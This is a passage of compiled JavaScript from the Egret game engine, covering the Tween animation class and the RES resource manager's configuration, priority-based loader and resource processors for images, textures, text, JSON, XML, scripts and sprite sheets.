var __reflect = (this && this.__reflect) || function (p, c, t) {
    p.__class__ = c, t ? t.push(c) : t = [c], p.__types__ = p.__types__ ? t.concat(p.__types__) : t;
};
var __extends = this && this.__extends || function __extends(t, e) { 
 function r() { 
 this.constructor = t;
}
for (var i in e) e.hasOwnProperty(i) && (t[i] = e[i]);
r.prototype = e.prototype, t.prototype = new r();
};
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var egret;
(function (egret) {
    var Tween = (function (_super) {
        __extends(Tween, _super);
        function Tween(target, props, pluginData) {
            var _this = _super.call(this) || this;
            _this._target = null;
            _this._useTicks = false;
            _this.ignoreGlobalPause = false;
            _this.loop = false;
            _this.pluginData = null;
            _this._steps = null;
            _this.paused = false;
            _this.duration = 0;
            _this._prevPos = -1;
            _this.position = null;
            _this._prevPosition = 0;
            _this._stepPosition = 0;
            _this.passive = false;
            _this.initialize(target, props, pluginData);
            return _this;
        }
        Tween.get = function (target, props, pluginData, override) {
            if (pluginData === void 0) { pluginData = null; }
            if (override === void 0) { override = false; }
            if (override) {
                Tween.removeTweens(target);
            }
            return new Tween(target, props, pluginData);
        };
        Tween.removeTweens = function (target) {
            if (!target.tween_count) {
                return;
            }
            var tweens = Tween._tweens;
            for (var i = tweens.length - 1; i >= 0; i--) {
                if (tweens[i]._target == target) {
                    tweens[i].paused = true;
                    tweens.splice(i, 1);
                }
            }
            target.tween_count = 0;
        };
        Tween.pauseTweens = function (target) {
            if (!target.tween_count) {
                return;
            }
            var tweens = egret.Tween._tweens;
            for (var i = tweens.length - 1; i >= 0; i--) {
                if (tweens[i]._target == target) {
                    tweens[i].paused = true;
                }
            }
        };
        Tween.resumeTweens = function (target) {
            if (!target.tween_count) {
                return;
            }
            var tweens = egret.Tween._tweens;
            for (var i = tweens.length - 1; i >= 0; i--) {
                if (tweens[i]._target == target) {
                    tweens[i].paused = false;
                }
            }
        };
        Tween.tick = function (timeStamp, paused) {
            if (paused === void 0) { paused = false; }
            var delta = timeStamp - Tween._lastTime;
            Tween._lastTime = timeStamp;
            var tweens = Tween._tweens.concat();
            for (var i = tweens.length - 1; i >= 0; i--) {
                var tween_1 = tweens[i];
                if ((paused && !tween_1.ignoreGlobalPause) || tween_1.paused) {
                    continue;
                }
                tween_1.$tick(tween_1._useTicks ? 1 : delta);
            }
            return false;
        };
        Tween._register = function (tween, value) {
            var target = tween._target;
            var tweens = Tween._tweens;
            if (value) {
                if (target) {
                    target.tween_count = target.tween_count > 0 ? target.tween_count + 1 : 1;
                }
                tweens.push(tween);
                if (!Tween._inited) {
                    Tween._lastTime = egret.getTimer();
                    egret.ticker.$startTick(Tween.tick, null);
                    Tween._inited = true;
                }
            }
            else {
                if (target) {
                    target.tween_count--;
                }
                var i = tweens.length;
                while (i--) {
                    if (tweens[i] == tween) {
                        tweens.splice(i, 1);
                        return;
                    }
                }
            }
        };
        Tween.removeAllTweens = function () {
            var tweens = Tween._tweens;
            for (var i = 0, l = tweens.length; i < l; i++) {
                var tween_2 = tweens[i];
                tween_2.paused = true;
                tween_2._target.tween_count = 0;
            }
            tweens.length = 0;
        };
        Tween.prototype.initialize = function (target, props, pluginData) {
            this._target = target;
            if (props) {
                this._useTicks = props.useTicks;
                this.ignoreGlobalPause = props.ignoreGlobalPause;
                this.loop = props.loop;
                props.onChange && this.addEventListener("change", props.onChange, props.onChangeObj);
                if (props.override) {
                    Tween.removeTweens(target);
                }
            }
            this.pluginData = pluginData || {};
            this._curQueueProps = {};
            this._initQueueProps = {};
            this._steps = [];
            if (props && props.paused) {
                this.paused = true;
            }
            else {
                Tween._register(this, true);
            }
            if (props && props.position != null) {
                this.setPosition(props.position, Tween.NONE);
            }
        };
        Tween.prototype.setPosition = function (value, actionsMode) {
            if (actionsMode === void 0) { actionsMode = 1; }
            if (value < 0) {
                value = 0;
            }
            var t = value;
            var end = false;
            if (t >= this.duration) {
                if (this.loop) {
                    var newTime = t % this.duration;
                    if (t > 0 && newTime === 0) {
                        t = this.duration;
                    }
                    else {
                        t = newTime;
                    }
                }
                else {
                    t = this.duration;
                    end = true;
                }
            }
            if (t == this._prevPos) {
                return end;
            }
            if (end) {
                this.setPaused(true);
            }
            var prevPos = this._prevPos;
            this.position = this._prevPos = t;
            this._prevPosition = value;
            if (this._target) {
                if (this._steps.length > 0) {
                    var l = this._steps.length;
                    var stepIndex = -1;
                    for (var i = 0; i < l; i++) {
                        if (this._steps[i].type == "step") {
                            stepIndex = i;
                            if (this._steps[i].t <= t && this._steps[i].t + this._steps[i].d >= t) {
                                break;
                            }
                        }
                    }
                    for (var i = 0; i < l; i++) {
                        if (this._steps[i].type == "action") {
                            if (actionsMode != 0) {
                                if (this._useTicks) {
                                    this._runAction(this._steps[i], t, t);
                                }
                                else if (actionsMode == 1 && t < prevPos) {
                                    if (prevPos != this.duration) {
                                        this._runAction(this._steps[i], prevPos, this.duration);
                                    }
                                    this._runAction(this._steps[i], 0, t, true);
                                }
                                else {
                                    this._runAction(this._steps[i], prevPos, t);
                                }
                            }
                        }
                        else if (this._steps[i].type == "step") {
                            if (stepIndex == i) {
                                var step = this._steps[stepIndex];
                                this._updateTargetProps(step, Math.min((this._stepPosition = t - step.t) / step.d, 1));
                            }
                        }
                    }
                }
            }
            this.dispatchEventWith("change");
            return end;
        };
        Tween.prototype._runAction = function (action, startPos, endPos, includeStart) {
            if (includeStart === void 0) { includeStart = false; }
            var sPos = startPos;
            var ePos = endPos;
            if (startPos > endPos) {
                sPos = endPos;
                ePos = startPos;
            }
            var pos = action.t;
            if (pos == ePos || (pos > sPos && pos < ePos) || (includeStart && pos == startPos)) {
                action.f.apply(action.o, action.p);
            }
        };
        Tween.prototype._updateTargetProps = function (step, ratio) {
            var p0, p1, v, v0, v1, arr;
            if (!step && ratio == 1) {
                this.passive = false;
                p0 = p1 = this._curQueueProps;
            }
            else {
                this.passive = !!step.v;
                if (this.passive) {
                    return;
                }
                if (step.e) {
                    ratio = step.e(ratio, 0, 1, 1);
                }
                p0 = step.p0;
                p1 = step.p1;
            }
            for (var n in this._initQueueProps) {
                if ((v0 = p0[n]) == null) {
                    p0[n] = v0 = this._initQueueProps[n];
                }
                if ((v1 = p1[n]) == null) {
                    p1[n] = v1 = v0;
                }
                if (v0 == v1 || ratio == 0 || ratio == 1 || (typeof (v0) != "number")) {
                    v = ratio == 1 ? v1 : v0;
                }
                else {
                    v = v0 + (v1 - v0) * ratio;
                }
                var ignore = false;
                if (arr = Tween._plugins[n]) {
                    for (var i = 0, l = arr.length; i < l; i++) {
                        var v2 = arr[i].tween(this, n, v, p0, p1, ratio, !!step && p0 == p1, !step);
                        if (v2 == Tween.IGNORE) {
                            ignore = true;
                        }
                        else {
                            v = v2;
                        }
                    }
                }
                if (!ignore) {
                    this._target[n] = v;
                }
            }
        };
        Tween.prototype.setPaused = function (value) {
            if (this.paused == value) {
                return this;
            }
            this.paused = value;
            Tween._register(this, !value);
            return this;
        };
        Tween.prototype._cloneProps = function (props) {
            var o = {};
            for (var n in props) {
                o[n] = props[n];
            }
            return o;
        };
        Tween.prototype._addStep = function (o) {
            if (o.d > 0) {
                o.type = "step";
                this._steps.push(o);
                o.t = this.duration;
                this.duration += o.d;
            }
            return this;
        };
        Tween.prototype._appendQueueProps = function (o) {
            var arr, oldValue, i, l, injectProps;
            for (var n in o) {
                if (this._initQueueProps[n] === undefined) {
                    oldValue = this._target[n];
                    if (arr = Tween._plugins[n]) {
                        for (i = 0, l = arr.length; i < l; i++) {
                            oldValue = arr[i].init(this, n, oldValue);
                        }
                    }
                    this._initQueueProps[n] = this._curQueueProps[n] = (oldValue === undefined) ? null : oldValue;
                }
                else {
                    oldValue = this._curQueueProps[n];
                }
            }
            for (var n in o) {
                oldValue = this._curQueueProps[n];
                if (arr = Tween._plugins[n]) {
                    injectProps = injectProps || {};
                    for (i = 0, l = arr.length; i < l; i++) {
                        if (arr[i].step) {
                            arr[i].step(this, n, oldValue, o[n], injectProps);
                        }
                    }
                }
                this._curQueueProps[n] = o[n];
            }
            if (injectProps) {
                this._appendQueueProps(injectProps);
            }
            return this._curQueueProps;
        };
        Tween.prototype._addAction = function (o) {
            o.t = this.duration;
            o.type = "action";
            this._steps.push(o);
            return this;
        };
        Tween.prototype._set = function (props, o) {
            for (var n in props) {
                o[n] = props[n];
            }
        };
        Tween.prototype.wait = function (duration, passive) {
            if (duration == null || duration <= 0) {
                return this;
            }
            var o = this._cloneProps(this._curQueueProps);
            return this._addStep({ d: duration, p0: o, p1: o, v: passive });
        };
        Tween.prototype.to = function (props, duration, ease) {
            if (ease === void 0) { ease = undefined; }
            if (isNaN(duration) || duration < 0) {
                duration = 0;
            }
            this._addStep({ d: duration || 0, p0: this._cloneProps(this._curQueueProps), e: ease, p1: this._cloneProps(this._appendQueueProps(props)) });
            return this.set(props);
        };
        Tween.prototype.call = function (callback, thisObj, params) {
            if (thisObj === void 0) { thisObj = undefined; }
            if (params === void 0) { params = undefined; }
            return this._addAction({ f: callback, p: params ? params : [], o: thisObj ? thisObj : this._target });
        };
        Tween.prototype.set = function (props, target) {
            if (target === void 0) { target = null; }
            this._appendQueueProps(props);
            return this._addAction({ f: this._set, o: this, p: [props, target ? target : this._target] });
        };
        Tween.prototype.play = function (tween) {
            if (!tween) {
                tween = this;
            }
            return this.call(tween.setPaused, tween, [false]);
        };
        Tween.prototype.pause = function (tween) {
            if (!tween) {
                tween = this;
            }
            return this.call(tween.setPaused, tween, [true]);
        };
        Tween.prototype.$tick = function (delta) {
            if (this.paused) {
                return;
            }
            this.setPosition(this._prevPosition + delta);
        };
        Tween.NONE = 0;
        Tween.LOOP = 1;
        Tween.REVERSE = 2;
        Tween._tweens = [];
        Tween.IGNORE = {};
        Tween._plugins = {};
        Tween._inited = false;
        Tween._lastTime = 0;
        return Tween;
    }(egret.EventDispatcher));
    egret.Tween = Tween;
    __reflect(Tween.prototype, "egret.Tween");
})(egret || (egret = {}));
var RES;
(function (RES) {
})(RES || (RES = {}));
var RES;
(function (RES) {
    RES.resourceNameSelector = function (p) { return p; };
    function getResourceInfo(path) {
        var result = RES.config.config.fileSystem.getFile(path);
        if (!result) {
            path = RES.resourceNameSelector(path);
            result = RES.config.config.fileSystem.getFile(path);
        }
        return result;
    }
    RES.getResourceInfo = getResourceInfo;
    var configItem;
    function setConfigURL(url, root) {
        var type;
        if (url.indexOf(".json") >= 0) {
            type = "legacyResourceConfig";
        }
        else {
            type = "resourceConfig";
        }
        configItem = { type: type, root: root, url: url, name: url };
    }
    RES.setConfigURL = setConfigURL;
    var ResourceConfig = (function () {
        function ResourceConfig() {
        }
        ResourceConfig.prototype.init = function () {
            if (!this.config) {
                this.config = {
                    alias: {}, groups: {}, resourceRoot: configItem.root,
                    mergeSelector: null,
                    fileSystem: null,
                    loadGroup: []
                };
            }
            return RES.queue.pushResItem(configItem).catch(function (e) {
                if (!RES.isCompatible) {
                    if (!e.__resource_manager_error__) {
                        if (e.error) {
                            console.error(e.error.stack);
                        }
                        else {
                            console.error(e.stack);
                        }
                        e = new RES.ResourceManagerError(1002);
                    }
                }
                RES.host.remove(configItem);
                return Promise.reject(e);
            });
        };
        ResourceConfig.prototype.getGroupByName = function (name) {
            var group = this.config.groups[name];
            var result = [];
            if (!group) {
                return result;
            }
            for (var _i = 0, group_1 = group; _i < group_1.length; _i++) {
                var paramKey = group_1[_i];
                var tempResult = void 0;
                tempResult = RES.config.getResourceWithSubkey(paramKey);
                if (tempResult == null) {
                    continue;
                }
                var r = tempResult.r, key = tempResult.key;
                if (r == null) {
                    throw new RES.ResourceManagerError(2005, key);
                }
                if (result.indexOf(r) == -1) {
                    result.push(r);
                }
            }
            return result;
        };
        ResourceConfig.prototype.__temp__get__type__via__url = function (url_or_alias) {
            var url = this.config.alias[url_or_alias];
            if (!url) {
                url = url_or_alias;
            }
            if (RES.typeSelector) {
                var type = RES.typeSelector(url);
                if (!type) {
                    throw new RES.ResourceManagerError(2004, url);
                }
                return type;
            }
            else {
                console.warn("RES.mapConfig 并未设置 typeSelector");
                return "unknown";
            }
        };
        ResourceConfig.prototype.getResourceWithSubkey = function (key) {
            key = this.getKeyByAlias(key);
            var index = key.indexOf("#");
            var subkey = "";
            if (index >= 0) {
                subkey = key.substr(index + 1);
                key = key.substr(0, index);
            }
            var r = this.getResource(key);
            if (!r) {
                return null;
            }
            else {
                return {
                    r: r, key: key, subkey: subkey
                };
            }
        };
        ResourceConfig.prototype.getKeyByAlias = function (aliasName) {
            if (this.config.alias[aliasName]) {
                return this.config.alias[aliasName];
            }
            else {
                return aliasName;
            }
        };
        ResourceConfig.prototype.getResource = function (path_or_alias) {
            var path = this.config.alias[path_or_alias];
            if (!path) {
                path = path_or_alias;
            }
            var r = getResourceInfo(path);
            if (!r) {
                return null;
            }
            else {
                return r;
            }
        };
        ResourceConfig.prototype.createGroup = function (name, keys, override) {
            if (override === void 0) { override = false; }
            if ((!override && this.config.groups[name]) || !keys || keys.length == 0) {
                return false;
            }
            var group = [];
            for (var _i = 0, keys_1 = keys; _i < keys_1.length; _i++) {
                var key = keys_1[_i];
                if (this.config.groups[key]) {
                    var groupInfo = this.config.groups[key];
                    group = group.concat(groupInfo);
                }
                else {
                    group.push(key);
                }
            }
            this.config.groups[name] = group;
            return true;
        };
        ResourceConfig.prototype.addSubkey = function (subkey, name) {
            this.addAlias(subkey, name + "#" + subkey);
        };
        ResourceConfig.prototype.addAlias = function (alias, key) {
            if (this.config.alias[key]) {
                key = this.config.alias[key];
            }
            this.config.alias[alias] = key;
        };
        ResourceConfig.prototype.addResourceData = function (data) {
            if (RES.hasRes(data.name)) {
                return;
            }
            if (!data.type) {
                data.type = this.__temp__get__type__via__url(data.url);
            }
            RES.config.config.fileSystem.addFile(data);
        };
        ResourceConfig.prototype.removeResourceData = function (data) {
            if (!RES.hasRes(data.name)) {
                return;
            }
            RES.config.config.fileSystem.removeFile(data.url);
            if (this.config.alias[data.name]) {
                delete this.config.alias[data.name];
            }
        };
        return ResourceConfig;
    }());
    RES.ResourceConfig = ResourceConfig;
    __reflect(ResourceConfig.prototype, "RES.ResourceConfig");
})(RES || (RES = {}));
var RES;
(function (RES) {
    var ResourceLoader = (function () {
        function ResourceLoader() {
            this.groupTotalDic = {};
            this.numLoadedDic = {};
            this.groupErrorDic = {};
            this.retryTimesDic = {};
            this.maxRetryTimes = 3;
            this.reporterDic = {};
            this.dispatcherDic = {};
            this.failedList = new Array();
            this.loadItemErrorDic = {};
            this.errorDic = {};
            this.itemListPriorityDic = {};
            this.itemLoadDic = {};
            this.promiseHash = {};
            this.lazyLoadList = new Array();
            this.loadingCount = 0;
            this.thread = 4;
        }
        ResourceLoader.prototype.pushResItem = function (resInfo) {
            if (this.promiseHash[resInfo.root + resInfo.name]) {
                return this.promiseHash[resInfo.root + resInfo.name];
            }
            this.lazyLoadList.push(resInfo);
            this.itemListPriorityDic[Number.NEGATIVE_INFINITY] = this.lazyLoadList;
            this.updatelistPriority(this.lazyLoadList, Number.NEGATIVE_INFINITY);
            var dispatcher = new egret.EventDispatcher();
            this.dispatcherDic[resInfo.root + resInfo.name] = dispatcher;
            var promise = new Promise(function (resolve, reject) {
                dispatcher.addEventListener("complete", function (e) {
                    resolve(e.data);
                }, null);
                dispatcher.addEventListener("error", function (e) {
                    reject(e.data);
                }, null);
            });
            this.promiseHash[resInfo.root + resInfo.name] = promise;
            this.loadNextResource();
            return promise;
        };
        ResourceLoader.prototype.pushResGroup = function (list, groupName, priority, reporter) {
            if (this.promiseHash[groupName]) {
                return this.promiseHash[groupName];
            }
            var total = list.length;
            for (var i = 0; i < total; i++) {
                var resInfo = list[i];
                if (!resInfo.groupNames) {
                    resInfo.groupNames = [];
                }
                resInfo.groupNames.push(groupName);
            }
            this.groupTotalDic[groupName] = list.length;
            this.numLoadedDic[groupName] = 0;
            this.updatelistPriority(list, priority);
            this.reporterDic[groupName] = reporter;
            var dispatcher = new egret.EventDispatcher();
            this.dispatcherDic[groupName] = dispatcher;
            var promise = new Promise(function (resolve, reject) {
                dispatcher.addEventListener("complete", resolve, null);
                dispatcher.addEventListener("error", function (e) {
                    reject(e.data);
                }, null);
            });
            this.promiseHash[groupName] = promise;
            this.loadNextResource();
            return promise;
        };
        ResourceLoader.prototype.updatelistPriority = function (list, priority) {
            if (this.itemListPriorityDic[priority] == undefined) {
                this.itemListPriorityDic[priority] = [];
            }
            for (var _i = 0, list_1 = list; _i < list_1.length; _i++) {
                var item = list_1[_i];
                if (this.itemLoadDic[item.root + item.name] == 1) {
                    continue;
                }
                var oldPriority = this.findPriorityInDic(item);
                if (oldPriority == undefined) {
                    this.itemListPriorityDic[priority].push(item);
                }
                else {
                    if (oldPriority < priority) {
                        this.itemListPriorityDic[priority].push(item);
                        var index = this.itemListPriorityDic[oldPriority].indexOf(item);
                        this.itemListPriorityDic[oldPriority].splice(index, 1);
                    }
                }
            }
        };
        ResourceLoader.prototype.findPriorityInDic = function (item) {
            for (var priority in this.itemListPriorityDic) {
                if (this.itemListPriorityDic[priority].indexOf(item) > -1)
                    return parseInt(priority);
            }
            return undefined;
        };
        ResourceLoader.prototype.loadNextResource = function () {
            while (this.loadingCount < this.thread) {
                var isload = this.loadSingleResource();
                if (!isload) {
                    break;
                }
            }
        };
        ResourceLoader.prototype.loadSingleResource = function () {
            var _this = this;
            var r = this.getOneResourceInfoInGroup();
            if (!r)
                return false;
            this.itemLoadDic[r.root + r.name] = 1;
            this.loadingCount++;
            this.loadResource(r)
                .then(function (response) {
                _this.loadingCount--;
                delete _this.itemLoadDic[r.root + r.name];
                RES.host.save(r, response);
                if (_this.promiseHash[r.root + r.name]) {
                    var dispatcher = _this.deleteDispatcher(r.root + r.name);
                    dispatcher.dispatchEventWith("complete", false, response);
                }
                var groupNames = r.groupNames;
                if (groupNames) {
                    delete r.groupNames;
                    for (var _i = 0, groupNames_1 = groupNames; _i < groupNames_1.length; _i++) {
                        var groupName = groupNames_1[_i];
                        if (_this.setGroupProgress(groupName, r)) {
                            _this.loadGroupEnd(groupName);
                        }
                    }
                }
                _this.loadNextResource();
            }).catch(function (error) {
                if (!error) {
                    throw r.name + " load fail";
                }
                if (!error.__resource_manager_error__) {
                    throw error;
                }
                delete _this.itemLoadDic[r.root + r.name];
                _this.loadingCount--;
                delete RES.host.state[r.root + r.name];
                var times = _this.retryTimesDic[r.name] || 1;
                if (times > _this.maxRetryTimes) {
                    delete _this.retryTimesDic[r.name];
                    if (_this.promiseHash[r.root + r.name]) {
                        var dispatcher = _this.deleteDispatcher(r.root + r.name);
                        dispatcher.dispatchEventWith("error", false, { r: r, error: error });
                    }
                    var groupNames = r.groupNames;
                    if (groupNames) {
                        delete r.groupNames;
                        for (var _i = 0, groupNames_2 = groupNames; _i < groupNames_2.length; _i++) {
                            var groupName = groupNames_2[_i];
                            if (!_this.loadItemErrorDic[groupName]) {
                                _this.loadItemErrorDic[groupName] = [];
                            }
                            if (_this.loadItemErrorDic[groupName].indexOf(r) == -1) {
                                _this.loadItemErrorDic[groupName].push(r);
                            }
                            _this.groupErrorDic[groupName] = true;
                            if (_this.setGroupProgress(groupName, r)) {
                                _this.loadGroupEnd(groupName, error);
                            }
                            else {
                                _this.errorDic[groupName] = error;
                            }
                        }
                    }
                    _this.loadNextResource();
                }
                else {
                    _this.retryTimesDic[r.name] = times + 1;
                    _this.failedList.push(r);
                    _this.loadNextResource();
                    return;
                }
            });
            return true;
        };
        ResourceLoader.prototype.getOneResourceInfoInGroup = function () {
            if (this.failedList.length > 0)
                return this.failedList.shift();
            var maxPriority = Number.NEGATIVE_INFINITY;
            for (var p in this.itemListPriorityDic) {
                maxPriority = Math.max(maxPriority, p);
            }
            var list = this.itemListPriorityDic[maxPriority];
            if (!list) {
                return undefined;
            }
            if (list.length == 0) {
                delete this.itemListPriorityDic[maxPriority];
                return this.getOneResourceInfoInGroup();
            }
            return list.shift();
        };
        ResourceLoader.prototype.setGroupProgress = function (groupName, r) {
            var reporter = this.reporterDic[groupName];
            this.numLoadedDic[groupName]++;
            var current = this.numLoadedDic[groupName];
            var total = this.groupTotalDic[groupName];
            if (reporter && reporter.onProgress) {
                reporter.onProgress(current, total, r);
            }
            return current == total;
        };
        ResourceLoader.prototype.loadGroupEnd = function (groupName, lastError) {
            delete this.groupTotalDic[groupName];
            delete this.numLoadedDic[groupName];
            delete this.reporterDic[groupName];
            var dispatcher = this.deleteDispatcher(groupName);
            if (!lastError) {
                var groupError = this.groupErrorDic[groupName];
                delete this.groupErrorDic[groupName];
                if (groupError) {
                    var itemList = this.loadItemErrorDic[groupName];
                    delete this.loadItemErrorDic[groupName];
                    var error = this.errorDic[groupName];
                    delete this.errorDic[groupName];
                    dispatcher.dispatchEventWith("error", false, { itemList: itemList, error: error });
                }
                else {
                    dispatcher.dispatchEventWith("complete");
                }
            }
            else {
                delete this.groupErrorDic[groupName];
                var itemList = this.loadItemErrorDic[groupName];
                delete this.loadItemErrorDic[groupName];
                dispatcher.dispatchEventWith("error", false, { itemList: itemList, lastError: lastError });
            }
        };
        ResourceLoader.prototype.deleteDispatcher = function (groupName) {
            delete this.promiseHash[groupName];
            var dispatcher = this.dispatcherDic[groupName];
            delete this.dispatcherDic[groupName];
            return dispatcher;
        };
        ResourceLoader.prototype.loadResource = function (r, p) {
            if (!p) {
                if (RES.FEATURE_FLAG.FIX_DUPLICATE_LOAD == 1) {
                    var s = RES.host.state[r.root + r.name];
                    if (s == 2) {
                        return Promise.resolve(RES.host.get(r));
                    }
                    if (s == 1) {
                        return r.promise;
                    }
                }
                p = RES.processor.isSupport(r);
            }
            if (!p) {
                throw new RES.ResourceManagerError(2001, r.name, r.type);
            }
            RES.host.state[r.root + r.name] = 1;
            var promise = p.onLoadStart(RES.host, r);
            r.promise = promise;
            return promise;
        };
        ResourceLoader.prototype.unloadResource = function (r) {
            var data = RES.host.get(r);
            if (!data) {
                console.warn("尝试释放不存在的资源:", r.name);
                return false;
            }
            var p = RES.processor.isSupport(r);
            if (p) {
                p.onRemoveStart(RES.host, r);
                RES.host.remove(r);
                if (r.extra == 1) {
                    RES.config.removeResourceData(r);
                }
                return true;
            }
            else {
                return true;
            }
        };
        return ResourceLoader;
    }());
    RES.ResourceLoader = ResourceLoader;
    __reflect(ResourceLoader.prototype, "RES.ResourceLoader");
})(RES || (RES = {}));
var RES;
(function (RES) {
    var processor;
    (function (processor_1) {
        function isSupport(resource) {
            return processor_1._map[resource.type];
        }
        processor_1.isSupport = isSupport;
        function map(type, processor) {
            processor_1._map[type] = processor;
        }
        processor_1.map = map;
        function promisify(loader, resource) {
            var _this = this;
            return new Promise(function (resolve, reject) {
                var onSuccess = function () {
                    var texture = loader['data'] ? loader['data'] : loader['response'];
                    resolve(texture);
                };
                var onError = function () {
                    var e = new RES.ResourceManagerError(1001, resource.url);
                    reject(e);
                };
                loader.addEventListener(egret.Event.COMPLETE, onSuccess, _this);
                loader.addEventListener(egret.IOErrorEvent.IO_ERROR, onError, _this);
            });
        }
        function getRelativePath(url, file) {
            if (file.indexOf("://") != -1) {
                return file;
            }
            url = url.split("\\").join("/");
            var params = url.match(/#.*|\?.*/);
            var paramUrl = "";
            if (params) {
                paramUrl = params[0];
            }
            var index = url.lastIndexOf("/");
            if (index != -1) {
                url = url.substring(0, index + 1) + file;
            }
            else {
                url = file;
            }
            return url + paramUrl;
        }
        processor_1.getRelativePath = getRelativePath;
        processor_1.ImageProcessor = {
            onLoadStart: function (host, resource) {
                var loader = new egret.ImageLoader();
                loader.load(RES.getVirtualUrl(resource.root + resource.url));
                return promisify(loader, resource)
                    .then(function (bitmapData) {
                    var texture = new egret.Texture();
                    texture._setBitmapData(bitmapData);
                    var r = host.resourceConfig.getResource(resource.name);
                    if (r && r.scale9grid) {
                        var list = r.scale9grid.split(",");
                        texture["scale9Grid"] = new egret.Rectangle(parseInt(list[0]), parseInt(list[1]), parseInt(list[2]), parseInt(list[3]));
                    }
                    return texture;
                });
            },
            onRemoveStart: function (host, resource) {
                var texture = host.get(resource);
                texture.dispose();
            }
        };
        processor_1.KTXTextureProcessor = {
            onLoadStart: function (host, resource) {
                return host.load(resource, 'bin').then(function (data) {
                    if (!data) {
                        console.error('ktx:' + resource.root + resource.url + ' is null');
                        return null;
                    }
                    var ktx = new egret.KTXContainer(data, 1);
                    if (ktx.isInvalid) {
                        console.error('ktx:' + resource.root + resource.url + ' is invalid');
                        return null;
                    }
                    var bitmapData = new egret.BitmapData(data);
                    bitmapData.debugCompressedTextureURL = resource.root + resource.url;
                    bitmapData.format = 'ktx';
                    ktx.uploadLevels(bitmapData, false);
                    var texture = new egret.Texture();
                    texture._setBitmapData(bitmapData);
                    var r = host.resourceConfig.getResource(resource.name);
                    if (r && r.scale9grid) {
                        var list = r.scale9grid.split(",");
                        texture["scale9Grid"] = new egret.Rectangle(parseInt(list[0]), parseInt(list[1]), parseInt(list[2]), parseInt(list[3]));
                    }
                    host.save(resource, texture);
                    return texture;
                }, function (e) {
                    host.remove(resource);
                    throw e;
                });
            },
            onRemoveStart: function (host, resource) {
                var texture = host.get(resource);
                if (texture) {
                    texture.dispose();
                }
            }
        };
        function makeEtc1SeperatedAlphaResourceInfo(resource) {
            return { name: resource.name + '_alpha', url: resource['etc1_alpha_url'], type: 'ktx', root: resource.root };
        }
        processor_1.makeEtc1SeperatedAlphaResourceInfo = makeEtc1SeperatedAlphaResourceInfo;
        processor_1.ETC1KTXProcessor = {
            onLoadStart: function (host, resource) {
                return host.load(resource, "ktx").then(function (colorTex) {
                    if (!colorTex) {
                        return null;
                    }
                    if (resource['etc1_alpha_url']) {
                        var r_1 = makeEtc1SeperatedAlphaResourceInfo(resource);
                        return host.load(r_1, "ktx")
                            .then(function (alphaMaskTex) {
                            if (colorTex && colorTex.$bitmapData && alphaMaskTex.$bitmapData) {
                                colorTex.$bitmapData.etcAlphaMask = alphaMaskTex.$bitmapData;
                                host.save(r_1, alphaMaskTex);
                            }
                            else {
                                host.remove(r_1);
                            }
                            return colorTex;
                        }, function (e) {
                            host.remove(r_1);
                            throw e;
                        });
                    }
                    return colorTex;
                }, function (e) {
                    host.remove(resource);
                    throw e;
                });
            },
            onRemoveStart: function (host, resource) {
                var colorTex = host.get(resource);
                if (colorTex) {
                    colorTex.dispose();
                }
                if (resource['etc1_alpha_url']) {
                    var r = makeEtc1SeperatedAlphaResourceInfo(resource);
                    var alphaMaskTex = host.get(r);
                    if (alphaMaskTex) {
                        alphaMaskTex.dispose();
                    }
                    host.unload(r);
                }
            }
        };
        processor_1.BinaryProcessor = {
            onLoadStart: function (host, resource) {
                var request = new egret.HttpRequest();
                request.responseType = egret.HttpResponseType.ARRAY_BUFFER;
                request.open(RES.getVirtualUrl(resource.root + resource.url), "get");
                request.send();
                return promisify(request, resource);
            },
            onRemoveStart: function (host, resource) {
            }
        };
        processor_1.TextProcessor = {
            onLoadStart: function (host, resource) {
                var request = new egret.HttpRequest();
                request.responseType = egret.HttpResponseType.TEXT;
                request.open(RES.getVirtualUrl(resource.root + resource.url), "get");
                request.send();
                return promisify(request, resource);
            },
            onRemoveStart: function (host, resource) {
                return true;
            }
        };
        processor_1.JsonProcessor = {
            onLoadStart: function (host, resource) {
                return host.load(resource, 'text').then(function (text) {
                    var data = JSON.parse(text);
                    return data;
                });
            },
            onRemoveStart: function (host, request) {
            }
        };
        processor_1.XMLProcessor = {
            onLoadStart: function (host, resource) {
                return host.load(resource, 'text').then(function (text) {
                    var data = egret.XML.parse(text);
                    return data;
                });
            },
            onRemoveStart: function (host, resource) {
                return true;
            }
        };
        processor_1.CommonJSProcessor = {
            onLoadStart: function (host, resource) {
                return host.load(resource, 'text').then(function (text) {
                    var f = new Function('require', 'exports', text);
                    var require = function () { };
                    var exports = {};
                    try {
                        f(require, exports);
                    }
                    catch (e) {
                        throw new RES.ResourceManagerError(2003, resource.name, e.message);
                    }
                    return exports;
                });
            },
            onRemoveStart: function (host, resource) {
            }
        };
        processor_1.SheetProcessor = {
            onLoadStart: function (host, resource) {
                return host.load(resource, "json").then(function (data) {
                    var r = host.resourceConfig.getResource(RES.nameSelector(data.file));
                    if (!r) {
                        var imageName = getRelativePath(resource.url, data.file);
                        r = { name: imageName, url: imageName, type: 'image', root: resource.root };
                    }
                    return host.load(r)
                        .then(function (bitmapData) {
                        if (!bitmapData) {
                            return null;
                        }
                        var frames = data.frames;
                        var spriteSheet = new egret.SpriteSheet(bitmapData);
                        spriteSheet["$resourceInfo"] = r;
                        for (var subkey in frames) {
                            var config = frames[subkey];
                            var texture = spriteSheet.createTexture(subkey, config.x, config.y, config.w, config.h, config.offX, config.offY, config.sourceW, config.sourceH);
                            if (config["scale9grid"]) {
                                var str = config["scale9grid"];
                                var list = str.split(",");
                                texture["scale9Grid"] = new egret.Rectangle(parseInt(list[0]), parseInt(list[1]), parseInt(list[2]), parseInt(list[3]));
                            }
                        }
                        host.save(r, bitmapData);
                        return spriteSheet;
                    }, function (e) {
                        host.remove(r);
                        throw e;
                    });
                });
            },
            getData: function (host, resource, key, subkey) {
                var data = host.get(resource);
                if (data) {
                    return data.getTexture(subkey);
                }
                else {
                    return null;
                }
            },
            onRemoveStart: function (host, resource) {
                var sheet = host.get(resource);
                var r = sheet["$resourceInfo"];
                sheet.dispose();
                host.unload(r);
            }
        };
